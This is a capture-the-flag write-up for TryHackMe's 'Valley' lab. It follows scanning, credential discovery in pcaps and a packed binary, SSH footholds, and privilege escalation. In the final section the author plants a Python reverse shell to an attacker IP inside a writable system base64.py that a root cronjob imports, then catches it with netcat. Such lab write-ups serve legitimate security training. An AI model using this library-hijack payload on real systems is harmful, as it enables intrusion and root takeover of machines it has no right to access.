---
layout: post
title: Writeup for TryHackMe's "Valley" Room
subtitle: By Anthony J. Saab
tags: ["https://tryhackme.com/room/valleype"]
comments: false
---

# 0 - Introduction
Link: [https://tryhackme.com/room/valleype](https://tryhackme.com/room/valleype)

This is a free room, which means anyone can deploy virtual machines in the room (without being subscribed)! This room is 3 days old at the time of writing
Created by tryhackme and valley

# 1 - Scanning

## 1a - Ports
### 1ai - Discovery
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -p- 10.10.23.36
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 08:27 EEST
Nmap scan report for 10.10.23.36
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 577.97 seconds
```

### 1aii - Versioning
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p22,80,37370 10.10.23.36
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 08:37 EEST
Nmap scan report for 10.10.23.36
Host is up (0.10s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
|_  256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
```

### 1aiii - Checking for vulnerabilities
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV --script vulners 10.10.23.36 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 08:39 EEST
Nmap scan report for 10.10.23.36
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|     	CVE-2020-15778	6.8	https://vulners.com/cve/CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	6.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	6.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	CVE-2020-12062	5.0	https://vulners.com/cve/CVE-2020-12062
|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|     	PACKETSTORM:171631	7.5	https://vulners.com/packetstorm/PACKETSTORM:171631	*EXPLOIT*
|     	EDB-ID:51193	7.5	https://vulners.com/exploitdb/EDB-ID:51193	*EXPLOIT*
|     	CVE-2023-25690	7.5	https://vulners.com/cve/CVE-2023-25690
|     	CVE-2022-31813	7.5	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	7.5	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	7.5	https://vulners.com/cve/CVE-2022-22720
|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2020-11984	7.5	https://vulners.com/cve/CVE-2020-11984
|     	CNVD-2022-73123	7.5	https://vulners.com/cnvd/CNVD-2022-73123
|     	CNVD-2022-03225	7.5	https://vulners.com/cnvd/CNVD-2022-03225
|     	CNVD-2021-102386	7.5	https://vulners.com/cnvd/CNVD-2021-102386
|     	5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	7.5	https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	*EXPLOIT*
|     	1337DAY-ID-38427	7.5	https://vulners.com/zdt/1337DAY-ID-38427*EXPLOIT*
|     	1337DAY-ID-34882	7.5	https://vulners.com/zdt/1337DAY-ID-34882*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CNVD-2022-03224	6.8	https://vulners.com/cnvd/CNVD-2022-03224
|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	6.8	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	*EXPLOIT*
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	4373C92A-2755-5538-9C91-0469C995AA9B	6.8	https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B	*EXPLOIT*
|     	0095E929-7573-5E4A-A7FA-F6598A35E8DE	6.8	https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE	*EXPLOIT*
|     	CVE-2022-28615	6.4	https://vulners.com/cve/CVE-2022-28615
|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
|     	CVE-2022-22721	5.8	https://vulners.com/cve/CVE-2022-22721
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2022-36760	5.1	https://vulners.com/cve/CVE-2022-36760
|     	CVE-2023-27522	5.0	https://vulners.com/cve/CVE-2023-27522
|     	CVE-2022-37436	5.0	https://vulners.com/cve/CVE-2022-37436
|     	CVE-2022-30556	5.0	https://vulners.com/cve/CVE-2022-30556
|     	CVE-2022-29404	5.0	https://vulners.com/cve/CVE-2022-29404
|     	CVE-2022-28614	5.0	https://vulners.com/cve/CVE-2022-28614
|     	CVE-2022-26377	5.0	https://vulners.com/cve/CVE-2022-26377
|     	CVE-2022-22719	5.0	https://vulners.com/cve/CVE-2022-22719
|     	CVE-2021-36160	5.0	https://vulners.com/cve/CVE-2021-36160
|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-30641	5.0	https://vulners.com/cve/CVE-2021-30641
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-9490	5.0	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2020-13950	5.0	https://vulners.com/cve/CVE-2020-13950
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2006-20001	5.0	https://vulners.com/cve/CVE-2006-20001
|     	CNVD-2022-73122	5.0	https://vulners.com/cnvd/CNVD-2022-73122
|     	CNVD-2022-53584	5.0	https://vulners.com/cnvd/CNVD-2022-53584
|     	CNVD-2022-53582	5.0	https://vulners.com/cnvd/CNVD-2022-53582
|     	CNVD-2022-03223	5.0	https://vulners.com/cnvd/CNVD-2022-03223
|     	CVE-2020-11993	4.3	https://vulners.com/cve/CVE-2020-11993
|_    	1337DAY-ID-35422	4.3	https://vulners.com/zdt/1337DAY-ID-35422*EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds

```

## 1b - Directory busting
```
                                                                    
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.23.36  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May 29 08:35:15 2023
URL_BASE: http://10.10.23.36/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.23.36/ ----
==> DIRECTORY: http://10.10.23.36/gallery/
+ http://10.10.23.36/index.html (CODE:200|SIZE:1163)   ==> DIRECTORY: http://10.10.23.36/pricing/
+ http://10.10.23.36/server-status (CODE:403|SIZE:276) ==> DIRECTORY: http://10.10.23.36/static/       
---- Entering directory: http://10.10.23.36/gallery/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.(Use mode '-w' if you want to scan it anyway)   
---- Entering directory: http://10.10.23.36/pricing/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.(Use mode '-w' if you want to scan it anyway)
---- Entering directory: http://10.10.23.36/static/ ----
+ http://10.10.23.36/static/00 (CODE:200|SIZE:127)     
+ http://10.10.23.36/static/1 (CODE:200|SIZE:2473315)   
+ http://10.10.23.36/static/10 (CODE:200|SIZE:2275927) 
+ http://10.10.23.36/static/11 (CODE:200|SIZE:627909)   
+ http://10.10.23.36/static/12 (CODE:200|SIZE:2203486) 
+ http://10.10.23.36/static/13 (CODE:200|SIZE:3673497)             
+ http://10.10.23.36/static/14 (CODE:200|SIZE:3838999)             
+ http://10.10.23.36/static/15 (CODE:200|SIZE:3477315)             
+ http://10.10.23.36/static/2 (CODE:200|SIZE:3627113)              
+ http://10.10.23.36/static/3 (CODE:200|SIZE:421858)               
+ http://10.10.23.36/static/4 (CODE:200|SIZE:7389635)              
+ http://10.10.23.36/static/5 (CODE:200|SIZE:1426557)              
+ http://10.10.23.36/static/6 (CODE:200|SIZE:2115495)              
+ http://10.10.23.36/static/7 (CODE:200|SIZE:5217844)              
+ http://10.10.23.36/static/8 (CODE:200|SIZE:7919631)              
+ http://10.10.23.36/static/9 (CODE:200|SIZE:1190575)              
                                                                               
-----------------
END_TIME: Mon May 29 08:53:37 2023
DOWNLOADED: 9224 - FOUND: 18
                                                                    
```

## 1c - What we know so far:
- The target machine exposes 3 ports: 22 (ssh), 80 (http), 37370 (ftp)
- The OS and applications of the target machine seem fairly up-to-date.
- The CVEs returned are not very useful.
- Directory busting might have returned interesting results worth inspecting.

# 2 - Manually exploring the webserver

So much data could be gathered by going through all of the directories and pages discovered by dirb. However, for the sake of keeping this writeup digestible, I will list the pages that would lead to gaining foothold:

## 2a - /static/00
![0704aa221b76460db5fd306e76d411f5](https://github.com/anthonyjsaab/thm-writeups/assets/56998706/f447bae3-fa0c-42df-b651-386f90550a5f)

## 2b - /dev1243224123123
![532ab41448efcffd6fa897bbc3142d40](https://github.com/anthonyjsaab/thm-writeups/assets/56998706/4c2faa45-86e9-4941-ae15-ea5f3221c393)


The first thing that comes to mind would be to bruteforce this login form. However, when opening the Network Inspector and attempting to login with dummy credentials, no packet is sent! However, something does happen when clicking on login. 

![2da8fde943cca89d81c87e93e05cf378](https://github.com/anthonyjsaab/thm-writeups/assets/56998706/b6b3f1fd-4520-43c3-81f9-711926416951)


This points out to login logic being embedded in JS code on the client side. 
Going to the Debugger leads to this: 

![7259b6fdef919d29b203754b40b0daa1](https://github.com/anthonyjsaab/thm-writeups/assets/56998706/f0cc274e-b296-4a04-8229-dc819c722fac)


The highlighted lines are VERY important, and we will see why:

## 2c - /dev1243224123123/devNotes37370.txt

![538c511109168d515e35550c65cb16a6](https://github.com/anthonyjsaab/thm-writeups/assets/56998706/b74d4937-6269-4ca2-b33b-5e11f30b5d38)


## 2d - What we know so far
- The team in charge of the target machine have a very bad security posture. They do claim to reuse credentials.
- The username "siemDev" paired with the password "california" might come in handy later.

# 3 - FTP
Trying out the set of credentials collected previously would lead to this:

```ftp
┌──(kali㉿kali)-[~]
└─$ ftp siemDev@10.10.23.36 37370
Connected to 10.10.23.36.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52360|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
ftp> get siemFTP.pcapng
local: siemFTP.pcapng remote: siemFTP.pcapng
229 Entering Extended Passive Mode (|||40897|)
150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
100% |***********************|  7272      127.10 KiB/s    00:00 ETA
226 Transfer complete.
7272 bytes received in 00:00 (42.47 KiB/s)
ftp> get siemHTTP1.pcapng
local: siemHTTP1.pcapng remote: siemHTTP1.pcapng
229 Entering Extended Passive Mode (|||35572|)
150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
100% |***********************|  1932 KiB  236.10 KiB/s    00:00 ETA
226 Transfer complete.
1978716 bytes received in 00:08 (233.24 KiB/s)
ftp> get siemHTTP2.pcapng
local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
229 Entering Extended Passive Mode (|||35965|)
150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
100% |***********************|  1926 KiB  439.09 KiB/s    00:00 ETA
226 Transfer complete.
1972448 bytes received in 00:04 (427.56 KiB/s)
ftp> exit
221 Goodbye.
                
```

# 4 - Wireshark analysis

Analysing the Wireshark captures were very time consuming. It is not possible to list every finding here. The most import finding was in the siemHTTP2.pcapng file while inspecting unencrypted packets:

![241680471-36355922-253e-40a1-9149-11d70946bdea](https://github.com/anthonyjsaab/thm-writeups/assets/56998706/c28f024a-2185-48c2-beeb-8f14b0c50e22)


The credentials valleyDev:p********* will prove to be important later.

# 5 - SSH - Part One

Trying the collected credentials on SSH would lead to gaining foothold!:
```text
┌──(kali㉿kali)-[~]
└─$ ssh valleyDev@10.10.23.36  
The authenticity of host '10.10.23.36 (10.10.23.36)' can't be established.
ED25519 key fingerprint is SHA256:cssZyBk7QBpWU8cMEAJTKWPfN5T2yIZbqgKbnrNEols.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.23.36' (ED25519) to the list of known hosts.
valleyDev@10.10.23.36's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ 
```

We also reached the first flag:

```text
valleyDev@valley:~$ ls -la user.txt
-rw-rw-rw- 1 root root 24 Mar 13 08:17 user.txt
```

# 6 - valleyDev's enumeration for privesc

# 6a - Essential outputs from LinEnum

```text
valleyDev@valley:~$ ./LinEnum.sh 

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sun 28 May 2023 11:28:45 PM PDT
### USER/GROUP ##########################################
[-] Are permissions on /home directories lax:
total 752K
drwxr-xr-x  5 root      root      4.0K Mar  6 13:19 .
drwxr-xr-x 21 root      root      4.0K Mar  6 15:40 ..
drwxr-x---  4 siemDev   siemDev   4.0K Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley    4.0K Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    732K Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev 4.0K May 28 23:26 valleyDev

### JOBS/TASKS ##########################################
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 2985 Mar 20 07:47 /etc/passwd
-rw-r--r-- 1 root root 1160 Mar 20 07:47 /etc/group
-rw-r--r-- 1 root root 581 Dec  5  2019 /etc/profile
-rw-r----- 1 root shadow 1905 Mar 20 07:47 /etc/shadow
### SCAN COMPLETE ####################################

```

# 6b - What we know so far:
- SUID/SGID are not an option
- A quick sudo -l leads to a dead end
- A very interesting cronjob belonging to root is worth inspecting: python3 /photos/script/photosEncrypt.py. It runs every minute.
- Two other standard users named "valley" and "siemDev" exist

# 7 - The Cronjob - Part One

When first discovering the cronjob, I thought I would be able to modify it or use it in a way similar to base64 and vi when they have the SUID bit set. However, inspecting the script would prove me wrong:

```python
valleyDev@valley:~$ cat /photos/script/photosEncrypt.py 
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)
```

# 8 - Finding another path: Pivoting

Seeing that the python script was not of much help, it seemed as if the "valleyDev" user wouldn't be the launchpad to gaining root access. I started looking for other ways. That is when I did an important discovery:

## 8a - /home/valleyAuthenticator
Normally, we only find folders in /home. However, on this target machine, there was an executable with a very interesting filename:

```text
valleyDev@valley:/home$ ls -la
total 752
drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 May 28 23:26 valleyDev
valleyDev@valley:/home$ ./valleyAuthenticator 
Welcome to Valley Inc. Authenticator
What is your username: 12
What is your password: 34
Wrong Password or Username
valleyDev@valley:/home$ 
```

## 8b - Investigating valleyAuthenticator

From the filename, I understood that this file was worth investigating. At first, I thought the executable might be communicating with an authentication server, and that I will need to bruteforce my way to reveal a secret. However, reviewing the LinEnum outputs made this scenario very unlikely. It now seemed that the secret could be embedded in the executable itself. A quick search on Google revealed that there was a tool that could be useful in this situation: strings.

### 8bi - strings - Part One
After downloading valleyAuthenticator to my Kali machine using SCP, I ran the strings command on it:

```text                 
┌──(kali㉿kali)-[~]
└─$ scp valleyDev@10.10.23.36:/home/valleyAuthenticator ~/Documents
valleyDev@10.10.23.36's password: 
valleyAuthenticator                              100%  732KB 189.5KB/s   00:03                                                                           
┌──(kali㉿kali)-[~]
└─$ strings Documents/valleyAuthenticator > strings1.txt
```

Going through the output revealed to be mostly gibberish. However, two snippets were interresting:
- While searching for "user", I found this:
```text
-^;x&
e67[REDACTED]ac
ddJ[REDACTED]6cfbOW
elcome to Valley Inc. Authentica
[k0rHh
 is your usernad
Ol: /passwXd.{
~{edJrong P= 
sL_striF::_M_M
v0ida%02xo
~ c-74
lrec
```
I felt that it was important, but I did not know how to proceed with it.
- While simply scrolling, I noticed this:
```text
W^YH
PROT_EXEC|PROT_WRITE failed.
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
_j<X
```

This was VERY interesting. This executable was packed using UPX. A quick search on Google revealed that I could uncompress the executable: using:

```
┌──(kali㉿kali)-[~]
└─$ upx -d Documents/valleyAuthenticator
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   2285616 <-    749128   32.78%   linux/amd64   valleyAuthenticator

Unpacked 1 file.
```

### 8bii - strings - Part Two

Using strings on this bigger executable leads to much more output, but they are much more human-readable. Searching again for "user" led me to this:

```
[]A\
I9\$xv.I
T$pH
tKU1
e6[REDACTED]ac
dd[REDACTED]fb
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
Wrong Password or Username
basic_string::_M_construct null not valid
%02x
basic_string::_M_construct null not valid
terminate called recursively
  what():  
```

When I saw this, I immediatly identified the two gibberish strings as potentially MD5 hashes. Putting them in CrackStation leads to:

![241681215-e4b8aa69-43bf-4cae-a683-e1228be13ed0](https://github.com/anthonyjsaab/thm-writeups/assets/56998706/ce8cc4d3-af51-4607-8058-490ce2b16cef)

Voila! We now have new credentials


# 9 - SSH - Part Two

Using the newly discovered credentials leads to:

```text
┌──(kali㉿kali)-[~]
└─$ ssh valley@10.10.23.36
valley@10.10.23.36's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 28 23:50:19 2023 from 10.8.124.134
valley@valley:~$ 
```

# 10 -  Enumerating (again)

Enumerating again did not lead to interesting results, at first. However, after countless unsuccessful attempts, an enumeration outputted something interesting:

```text
valley@valley:~$ find / -writable -type d 2>/dev/null
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
...
/usr/lib/python3.8
...
```

By using the user "valley", I could possibly change the PyPI packages stored on the target machine!

Inspecting the folder left no doubt: I can execute a supply chain attack by modifying the base64 package used in the cronjob's script!
```text
valley@valley:~$ ls -la /usr/lib/python3.8
total 4908
drwxrwxr-x  30 root valleyAdmin  20480 Mar 20 07:48 .
drwxr-xr-x 112 root root          4096 Mar 20 14:34 ..
...
-rw-r--r--   1 root root         20094 Mar 13 03:26 asyncore.py
-rwxrwxr-x   1 root valleyAdmin  20382 Mar 13 03:26 base64.py
...
```

# 11 - The Cronjob - Part Two

With the help of revshells.com, I modified base64.py to include:

```python
# Modified 22-May-2007 by Guido van Rossum to use bytes everywhere

import re
import struct
import binascii

import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.124.134",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

After a minute, we get a reverse shell and can finally access the root flag!: 
```text
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.8.124.134] from (UNKNOWN) [10.10.23.36] 43632
# whoami
whoami
root
# ls -la
ls -la
total 56
drwx------  8 root root 4096 Mar 13 08:17 .
drwxr-xr-x 21 root root 4096 Mar  6 15:40 ..
...
-rw-r--r--  1 root root   37 Mar 13 08:17 root.txt
...
# 
```
